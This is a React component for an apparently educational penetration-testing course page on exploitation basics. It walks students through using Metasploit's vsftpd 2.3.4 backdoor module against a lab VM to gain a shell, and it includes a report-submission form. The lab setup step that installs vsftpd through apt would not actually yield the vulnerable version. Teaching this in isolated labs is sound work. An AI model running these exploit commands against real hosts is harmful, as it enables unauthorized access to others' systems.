import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  FaArrowLeft,
  FaCode,
  FaList,
  FaLink,
  FaEdit,
  FaCheckCircle,
  FaRocket,
  FaBookOpen,
  FaBug,
} from "react-icons/fa";
import { useAuth } from "../../../context/authContext";

const Dett6: React.FC = () => {
  const navigate = useNavigate();
  const { userData, userToken } = useAuth();

  // State for submission field
  const [submitted, setSubmitted] = useState(false);
  const [form, setForm] = useState({
    assignmentId: 6,
    userId: userData?.userDetails.id ?? "",
    fileUrl: "",
  });

  // Handle file upload for PDF submissions
  const handleFileUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file && file.type === "application/pdf") {
      // Simulate file upload to a server (replace with actual upload logic)
      const fileUrl = URL.createObjectURL(file); // Temporary URL for demo
      setForm((prev) => ({
        ...prev,
        fileUrl: fileUrl,
      }));
    } else {
      alert("Please upload a valid PDF file.");
    }
  };

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log("Form Data:", form);

    if (!userToken) {
      alert("Authentication error. Please log in again.");
      return;
    }

    try {
      const response = await fetch("http://localhost:8080/api/v1/assignments/submit", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${userToken}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(form),
      });

      if (response.ok) {
        setSubmitted(true);
        alert("Assignment submitted successfully!");
      } else {
        const errorData = await response.json();
        alert(`Error: ${errorData.message}`);
      }
    } catch (error) {
      console.error("Error submitting assignment:", error);
      alert("Failed to submit. Please try again later.");
    }
  };

  return (
    <>
      <section className="bg-white shadow-lg rounded-lg p-4 sm:p-6 md:p-8 mb-8 mx-auto max-w-5xl">
        {/* Back Button */}
        <button
          onClick={() => navigate(-1)}
          className="flex items-center text-gray-600 hover:text-indigo-600 mb-6 transition-all duration-300 ease-in-out transform hover:scale-105 p-2"
        >
          <FaArrowLeft className="mr-2 text-lg" />
          Back
        </button>

        {/* Section Heading */}
        <div className="bg-indigo-600 text-white py-4 px-6 rounded-t-lg flex items-center">
          <FaBug className="mr-3 text-2xl" />
          <h1 className="text-2xl sm:text-3xl font-extrabold uppercase">Exploitation Basics</h1>
        </div>

        <div className="p-4 sm:p-6">
          {/* Introduction to Exploitation Basics */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-3 flex items-center">
              <FaEdit className="mr-2 text-indigo-600" />
              Introduction to Exploitation Basics
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Exploitation is the phase in penetration testing where vulnerabilities are actively leveraged to gain unauthorized access to systems or data. The Metasploit Framework, a powerful open-source tool, enables ethical hackers to test exploits against identified weaknesses, such as FTP flaws, in a controlled environment. This module builds on vulnerability mapping from <code>Dett5</code>, focusing on using Metasploit to exploit vulnerabilities, with FTP services as a practical example. These skills are crucial for Week 4’s network security audit and prepare you for real-world penetration testing scenarios.
            </p>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
              Mastering exploitation basics equips ethical hackers to simulate attacker techniques responsibly, helping organizations strengthen their defenses. All exploitation activities must be conducted with explicit permission to ensure compliance with legal and ethical standards, emphasizing the importance of safe, lab-based testing.
            </p>
          </div>

          {/* Understanding Exploitation Basics */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaCode className="mr-2 text-indigo-600" />
              Understanding Exploitation Basics
            </h2>
            <div className="space-y-6">
              {/* What is Exploitation? */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  1. What is Exploitation?
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Exploitation involves using vulnerabilities to bypass security controls, gain unauthorized access, or execute arbitrary code. In ethical hacking, exploitation is performed to demonstrate the impact of weaknesses and recommend mitigations.
                </p>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed">
                  Example: Exploiting an FTP server with weak authentication to gain access to sensitive files.
                </p>
              </div>

              {/* Metasploit Framework */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  2. Metasploit Framework
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Metasploit is a modular penetration testing platform that provides exploits, payloads, and auxiliary modules. It allows testers to select exploits, configure payloads (e.g., reverse shells), and execute attacks against vulnerable services.
                </p>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Install Metasploit on Kali Linux
sudo apt update
sudo apt install metasploit-framework
# Start Metasploit console
msfconsole`}
                </pre>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Key components: Exploits (code to leverage vulnerabilities), Payloads (code executed post-exploitation), and Modules (auxiliary tools for scanning or enumeration).
                </p>
              </div>

              {/* Exploiting FTP Flaws */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  3. Exploiting FTP Flaws
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  FTP (File Transfer Protocol) services are common targets due to vulnerabilities like weak credentials, anonymous access, or software bugs (e.g., vsftpd 2.3.4 backdoor). Metasploit provides modules to exploit these flaws.
                </p>
                <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
                  {`# Search for FTP exploits
msfconsole
search ftp
# Use vsftpd backdoor exploit
use exploit/unix/ftp/vsftpd_234_backdoor
# Configure options
set RHOSTS 192.168.56.20
set RPORT 21
# Run exploit
exploit`}
                </pre>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Example: Gain a shell on a vulnerable FTP server running vsftpd 2.3.4.
                </p>
              </div>

              {/* Ethical and Safety Considerations */}
              <div>
                <h3 className="text-lg font-semibold text-gray-800 mb-2 flex items-center">
                  <FaCode className="mr-2 text-indigo-600" />
                  4. Ethical and Safety Considerations
                </h3>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-3">
                  Exploitation carries significant risks and requires strict adherence to ethical guidelines:
                </p>
                <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-2">
                  <li>
                    <strong>Authorization:</strong> Obtain written permission (e.g., Rules of Engagement) before testing.
                  </li>
                  <li>
                    <strong>Scope:</strong> Limit exploitation to approved systems to avoid unintended consequences.
                  </li>
                  <li>
                    <strong>Controlled Environment:</strong> Use isolated lab setups to prevent damage to live systems.
                  </li>
                  <li>
                    <strong>Reporting:</strong> Document exploits, their impact, and remediation steps in a professional report.
                  </li>
                  <li>
                    <strong>Post-Exploitation Cleanup:</strong> Remove payloads and restore systems to their original state.
                  </li>
                </ul>
                <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-2">
                  Unauthorized exploitation can lead to legal consequences and system damage, emphasizing the need for ethical practices.
                </p>
              </div>
            </div>
          </div>

          {/* Practical Exercise */}
          <div className="mb-8 bg-indigo-50 border border-indigo-200 rounded-lg p-4 sm:p-6">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaRocket className="mr-2 text-indigo-600" />
              Practical Exercise: Exploiting FTP Vulnerabilities with Metasploit
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Apply exploitation skills by using Metasploit to exploit an FTP vulnerability in a safe lab environment. Submit a PDF report documenting your process, results, and remediation recommendations.
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Set up two VMs in VirtualBox (Kali Linux: <code>192.168.56.10/24</code>, Ubuntu: <code>192.168.56.20/24</code>) using a Host-Only network (from <code>Dett5</code>).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                On the Ubuntu VM, install and configure a vulnerable FTP server (e.g., vsftpd 2.3.4 for testing purposes).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                On the Kali VM, install Metasploit and verify it’s operational.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Use Metasploit to scan the Ubuntu VM for FTP vulnerabilities (e.g., with the <code>ftp_version</code> auxiliary module).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Select and configure an FTP exploit (e.g., <code>vsftpd_234_backdoor</code>) to gain access to the Ubuntu VM.
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Execute the exploit and document the outcome (e.g., shell access, files accessed).
              </li>
              <li className="flex items-start">
                <FaList className="mr-2 mt-1 text-indigo-600" />
                Create a PDF report (200–300 words) detailing the vulnerability, exploit process, results, and remediation steps (e.g., update vsftpd, disable anonymous access).
              </li>
            </ul>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4">
              Here’s a starter guide for the lab:
            </p>
            <pre className="bg-gray-800 text-white p-4 rounded overflow-x-auto text-sm sm:text-base">
              {`# On Ubuntu VM (192.168.56.20)
# Install vsftpd (vulnerable version for testing)
sudo apt update
sudo apt install vsftpd
# Configure vsftpd (ensure vulnerable version, e.g., 2.3.4)
sudo systemctl start vsftpd

# On Kali VM (192.168.56.10)
# Install Metasploit
sudo apt update
sudo apt install metasploit-framework

# Start Metasploit
msfconsole
# Scan FTP version
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.56.20
run

# Use vsftpd backdoor exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.20
set RPORT 21
exploit

# Document results
# Save Metasploit output to a file
# Create PDF report using a text editor or reporting tool
`}
            </pre>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mt-4 italic">
              Complete the exercise, test your setup, and submit your PDF report below!
            </p>
          </div>

          {/* PDF Submission */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaLink className="mr-2 text-indigo-600" />
              Submit Your Work
            </h2>
            <form onSubmit={handleSubmit} className="space-y-4">
              <label
                className="block text-gray-800 text-sm sm:text-base font-semibold mb-2"
                htmlFor="fileUrl"
              >
                Upload Your PDF Report:
              </label>
              <input
                type="file"
                name="fileUrl"
                accept="application/pdf"
                className="w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500 transition-all duration-200"
                onChange={handleFileUpload}
              />
              <button
                type="submit"
                className="bg-indigo-600 text-white py-2 px-6 rounded-md hover:bg-indigo-700 transition-all duration-300 ease-in-out transform hover:scale-105"
              >
                Submit Exercise
              </button>
            </form>
            {submitted && (
              <p className="mt-4 text-green-600 font-medium flex items-center">
                <FaCheckCircle className="mr-2" />
                Your exercise has been submitted successfully!
              </p>
            )}
          </div>

          {/* Exploitation Basics Resources */}
          <div className="mb-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 flex items-center">
              <FaBookOpen className="mr-2 text-indigo-600" />
              Exploitation Basics Resources
            </h2>
            <p className="text-gray-700 text-sm sm:text-base leading-relaxed mb-4">
              Enhance your exploitation skills with these resources:
            </p>
            <ul className="list-disc list-inside text-gray-700 text-sm sm:text-base space-y-3">
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://docs.metasploit.com/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  Metasploit Framework Documentation
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://www.offensive-security.com/metasploit-unleashed/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  Offensive Security - Metasploit Unleashed
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://www.hackingarticles.in/metasploit-for-beginners/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  Hacking Articles - Metasploit for Beginners
                </a>
              </li>
              <li className="flex items-start">
                <FaLink className="mr-2 mt-1 text-indigo-600" />
                <a
                  href="https://tryhackme.com/path/outline/metasploit"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-indigo-600 underline hover:text-indigo-800"
                >
                  TryHackMe - Metasploit Learning Path
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </>
  );
};

export default Dett6;